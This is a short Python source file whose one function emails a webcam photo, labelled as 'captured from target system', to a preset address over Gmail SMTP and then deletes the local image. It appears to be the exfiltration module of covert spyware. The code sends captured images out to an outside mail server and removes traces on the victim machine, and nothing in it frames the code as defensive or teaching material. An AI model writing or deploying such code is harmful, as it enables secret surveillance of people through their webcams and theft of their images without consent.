import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

SENDER_EMAIL = "email"
SENDER_PASSWORD = "emailcode"  # 🔥 New App Password
RECEIVER_EMAIL = "email"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

def send_photo(photo_path):
    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = "Webcam Capture"

        body = "Webcam photo captured from target system."
        msg.attach(MIMEText(body, 'plain'))

        with open(photo_path, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(photo_path)}')
            msg.attach(part)

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.send_message(msg)
        server.quit()
        
        # Delete photo after sending
        try:
            os.remove(photo_path)
        except:
            pass
        return True
    except Exception as e:
        print(f"Email error: {e}")
        return False
